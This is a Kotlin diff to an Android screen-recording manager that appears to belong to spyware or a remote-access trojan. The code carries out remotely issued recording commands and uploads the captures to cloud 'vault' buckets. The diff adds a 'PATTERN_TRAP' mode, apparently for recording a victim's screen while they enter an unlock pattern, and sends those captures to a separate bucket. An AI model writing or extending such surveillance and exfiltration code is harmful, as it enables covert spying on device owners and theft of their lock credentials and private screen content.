@@ -155,25 +155,29 @@ object ScreenRecordManager {
         mediaProjection?.stop()
         mediaProjection = null
         
-        isRecording = false
-        isPatternTrap = false
-        DebugLogger.log("SCREEN_REC", "Hardware resources released.")
-        
-        if (tempFile.exists() && tempFile.length() > 0) {
-            val finalFile = File(ctx.cacheDir, "vid_$timestamp.mp4")
-            tempFile.renameTo(finalFile)
+                    isRecording = false
+            val wasPatternTrap = isPatternTrap
+            isPatternTrap = false
+            DebugLogger.log("SCREEN_REC", "Hardware resources released.")
             
-            // Use runBlocking to ensure IO upload thread finishes before cleanup destroys scope
-            runBlocking { 
-                if (CloudManager.uploadFile(ctx, finalFile, "SCREEN_RECORD")) {
-                    CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "UPLOAD_SUCCESS", null, null, "SCREEN_RECORD/${finalFile.name}")
-                    finalFile.delete()
-                } else {
-                    DumpManager.vaultMedia(finalFile, "SCREEN_RECORD")
-                    CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "QUEUED_OFFLINE", "Media vaulted locally pending network.")
+            if (tempFile.exists() && tempFile.length() > 0) {
+                val finalFile = File(ctx.cacheDir, "vid_$timestamp.mp4")
+                tempFile.renameTo(finalFile)
+                
+                val bucket = if (wasPatternTrap) "cortex-vision-vault" else "cortex-vault"
+                val category = if (wasPatternTrap) "PATTERN_TRAP" else "SCREEN_RECORD"
+                
+                // Use runBlocking to ensure IO upload thread finishes before cleanup destroys scope
+                runBlocking { 
+                    if (CloudManager.uploadFile(ctx, finalFile, category, null, bucket)) {
+                        CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "UPLOAD_SUCCESS", null, null, "$category/${finalFile.name}")
+                        finalFile.delete()
+                    } else {
+                        DumpManager.vaultMedia(finalFile, category)
+                        CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "QUEUED_OFFLINE", "Media vaulted locally pending network.")
+                    }
                 }
-            }
-        } else if (tempFile.exists()) {
+            } else if (tempFile.exists()) {
             tempFile.delete()
         }
     }
